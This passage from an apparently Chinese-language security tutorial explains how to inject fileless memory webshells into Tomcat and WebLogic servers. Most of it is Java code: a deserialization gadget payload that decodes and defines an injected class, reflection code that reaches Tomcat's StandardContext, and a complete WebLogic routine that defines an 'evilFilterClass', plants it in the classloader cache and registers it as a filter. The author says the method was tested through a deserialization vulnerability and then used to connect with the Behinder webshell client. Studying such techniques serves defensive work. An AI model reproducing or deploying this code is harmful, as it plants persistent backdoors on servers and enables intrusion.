    //        }
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static Field getField(final Class clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
        public static void main(String[] args) throws Exception {
            // String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            // InvocationHandler obj = cc3.getobject(cmd);
            // hello.deserializeToObject(hello.serializeToString(obj));
            String cmd = "try{sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();" +
    ? ? "byte[] inject_omcat_bytes = decoder.decodeBuffer(\"inject_tomcat base64编码后数据\");\n" +
    ? ? "java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{byte[].class, int.class, int.class});" +
    ? ? "defineClassMethod.setAccessible(true);" +
    ? ? "Class myclass = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(),? inject_omcat_bytes, 0, inject_omcat_bytes.length);" +
    ? ? "java.lang.reflect.Constructor MFconstructor = myclass.getConstructor();" +
    ? ? "MFconstructor.setAccessible(true);" +
    ? ? "MFconstructor.newInstance();}catch (Exception e){e.printStackTrace();}";
    InvocationHandler obj = cc3.getobject(cmd);
    hello.deserializeToObject(hello.serializeToString(obj));
        }
    }
**效果** 冰蝎配置连接
成功连接
至此，测试完毕。
#### 3.threade3am方法获取context
借鉴threade3am师傅的项目地址，我们从中摘出来我们想要的获取context部分代码
    String filterUrlPattern = "/*";
            String filterName = filtername;
            System.out.println(url+"   ");
            try {
                System.out.println("SSSSSS start start start");
                /*刚开始反序列化后执行的逻辑*/
                //修改 WRAP_SAME_OBJECT 值为 true
                java.lang.Class c1 = java.lang.Class.forName("org.apache.catalina.core.ApplicationDispatcher");
                java.lang.reflect.Field f1 = c1.getDeclaredField("WRAP_SAME_OBJECT");
                java.lang.reflect.Field modifiersField = f1.getClass().getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f1, f1.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
                f1.setAccessible(true);
                if (!f1.getBoolean(null)) {
                    f1.setBoolean(null, true);
                }
                //初始化 lastServicedRequest
                c1 = java.lang.Class.forName("org.apache.catalina.core.ApplicationFilterChain");
                f1 = c1.getDeclaredField("lastServicedRequest");
                modifiersField = f1.getClass().getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f1, f1.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
                f1.setAccessible(true);
                if (f1.get(null) == null) {
                    f1.set(null, new ThreadLocal());
                }
                //初始化 lastServicedResponse
                f1 = c1.getDeclaredField("lastServicedResponse");
                modifiersField = f1.getClass().getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f1, f1.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
                f1.setAccessible(true);
                if (f1.get(null) == null) {
                    f1.set(null, new ThreadLocal());
                }
    //            java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
                java.lang.reflect.Field f = c1.getDeclaredField("lastServicedRequest");
    //            System.out.println("11111111111111111111");
                f.setAccessible(true);
                java.lang.ThreadLocal t = (java.lang.ThreadLocal) f.get(null);
                /*shell注入，前提需要能拿到request、response等*/
                if (t != null && t.get() != null) {
                    javax.servlet.ServletRequest servletRequest = (javax.servlet.ServletRequest) t.get();
                    System.out.println(servletRequest);
                    javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
                    System.out.println(servletContext);
                    //获取ApplicationContext
                    Field field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
                    //获取StandardContext
                    field = applicationContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(applicationContext);
                    .....
       }
分析代码，获取context分为两步，首先修改 WRAP_SAME_OBJECT 值为 true 然后初始化
lastServicedRequest，最后从javax.servlet.ServletRequest获取context
使用上面的测试环境，成功注入filter
#### **注: 以上方式tomcat6 均不可**
tomcat6缺少javax.servlet.DispatcherType类
# 三、Weblogic 内存马注入
原理同样使用使用动态注册Filter 的方式
参考文章我们直接跟着大佬的文章走吧
跟进weblogic的Filter关键流程，断点下到doFilter，通过查看堆栈信息定位一些关键函数、
>
> 通过跟踪堆栈信息，我们可以找到，在wrapRun函数中，会判断系统中是否存在filter以及listener。如果存在，则获取FilterChain，然后依次调用Filter。原理与tomcat类似
跟进getFilterChain函数，它在FilterManger中，这个weblogic.servlet.internal.FilterManager，是weblogic用来管理filter的，我们需要的动态注册Filter功能它也提供了，好方便，直接就有了，比tomcat方便多了！
我们现在已经知道FilterManger有这个功能，现在就是要获取FIlterManger，在weblogic中，context会存放FilterManger，这个问题就成了如何获取context，很熟悉是不是2333
和Tomcat一样，存在两种方法，
  * 从pageContext取 jsp页面中存在
  * 从线程中取
不再讨论第一种，直接看第二种
    Class executeThread = Class.forName("weblogic.work.ExecuteThread");
    Method m = executeThread.getDeclaredMethod("getCurrentWork");
    Object currentWork = m.invoke(Thread.currentThread());
    Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
    connectionHandlerF.setAccessible(true);
    Object obj = connectionHandlerF.get(currentWork);
    Field requestF = obj.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    obj = requestF.get(obj);
    Field contextF = obj.getClass().getDeclaredField("context");
    contextF.setAccessible(true);
    Object context = contextF.get(obj);
现在我们成功获取到了context，接下来就是调用registerFilter函数将我们的filter注册，但是这里遇到了一个问题，在FilterManager的registerFilter方法中，主要通过FilterWrapper类去包装Filter类。但是FilterWrapper类的构造函数中，并没有可以传递Class的参数，只可以传递ClassName，FilterManager通过ClassName去查找Class，这个就蛋疼了，如果直接调用这个方法，肯定找不到的呀
这里跟下过程，FIlter将会在loadFIlter中实例化，
filterWrapper.getFilterClassName中获取FilterClass的名称，然后通过context的createInstance方法去实例化。createInstance
我们看到了classloader，weblogic中有自定义的classloader，跟进它的loadclass方法，会首先从cache中查找是否存在待查找的类，如果存在，则直接返回该名称对应的Class
    public Class loadClass(String name) throws ClassNotFoundException {
        boolean doTrace = ctDebugLogger.isDebugEnabled();
        if (doTrace) {
            ClassLoaderDebugger.debug(this, SupportedClassLoader.CACL, "loadClass", name);
        }
        Class res = (Class)this.cachedClasses.get(name);
        if (res != null) {
            return res;
        } else {
            try {
                if (!this.childFirst) {
                    return super.loadClass(name);
                } else if (!name.startsWith("java.") && (!name.startsWith("javax.") || name.startsWith("javax.xml")) && !name.startsWith("weblogic.")) {
                    try {
                        synchronized(this) {
                            return this.findClass(name);
                        }
                    } catch (ClassNotFoundException var7) {
                        return super.loadClass(name);
                    }
                } else {
                    return super.loadClass(name);
                }
            } catch (Error var8) {
                if (doTrace) {
                    ClassLoaderDebugger.debug(this, var8);
                }
                throw var8;
            } catch (ClassNotFoundException var9) {
                if (doTrace) {
                    ClassLoaderDebugger.debug(this, var9);
                }
                throw var9;
            }
        }
    }
参考文章直接给出，我们可以通过反射直接将自己的Filter放到这个缓存中，问题都解决了，整体实现代码
    try {
    ? ? ? ? ? ? Class executeThread = Class.forName("weblogic.work.ExecuteThread");
    ? ? ? ? ? ? Method m = executeThread.getDeclaredMethod("getCurrentWork");
    ? ? ? ? ? ? Object currentWork = m.invoke(Thread.currentThread());
    ? ? ? ? ? ? Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
    ? ? ? ? ? ? connectionHandlerF.setAccessible(true);
    ? ? ? ? ? ? Object obj = connectionHandlerF.get(currentWork);
    ? ? ? ? ? ? Field requestF = obj.getClass().getDeclaredField("request");
    ? ? ? ? ? ? requestF.setAccessible(true);
    ? ? ? ? ? ? obj = requestF.get(obj);
    ? ? ? ? ? ? Field contextF = obj.getClass().getDeclaredField("context");
    ? ? ? ? ? ? contextF.setAccessible(true);
    ? ? ? ? ? ? Object context = contextF.get(obj);
    ? ? ? ? ? ? Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
    ? ? ? ? ? ? Object filterManager = getFilterManagerM.invoke(context);
    ? ? ? ? ? ? Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
    // String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
    ? ? ? ? ? ? registerFilterM.setAccessible(true);
    ? ? ? ? ? ? Field classLoaderF = context.getClass().getDeclaredField("classLoader");
    ? ? ? ? ? ? classLoaderF.setAccessible(true);
    ? ? ? ? ? ? ClassLoader cl = (ClassLoader) classLoaderF.get(context);
    ? ? ? ? ? ? Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
    ? ? ? ? ? ? cachedClassesF.setAccessible(true);
    ? ? ? ? ? ? Object cachedClass = cachedClassesF.get(cl);
    ? ? ? ? ? ? Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
    ? ? ? ? ? ? if (getM.invoke(cachedClass, "Myfilter") == null) {
    ? ? ? ? ? ? ? ? byte[] Uclassbate = new byte[] {Filter的字节码数据};
    ? ? ? ? ? ? ? ? Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    ? ? ? ? ? ? ? ? defineClass.setAccessible(true);
    ? ? ? ? ? ? ? ? Class evilFilterClass = (Class) defineClass.invoke(cl, Uclassbate, 0, Uclassbate.length);
    // 恶意类名称为 Myfilter? filter 名称为filtername
    ? ? ? ? ? ? ? ? Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
    ? ? ? ? ? ? ? ? putM.invoke(cachedClass, "Myfilter", evilFilterClass);
    ? ? ? ? ? ? }
    ? ? ? ? ? ? registerFilterM.invoke(filterManager, filterName, "Myfilter", new String[]{filterUrlPattern}, null, null, null);
    ? ? ? ? } catch (Exception e) {
    ? ? ? ? ? ? e.printStackTrace();
    ? ? ? ? }
wblogic12.1.3测试成功，这里直接用反序列化漏洞打的
#
# 四、参考链接
* * *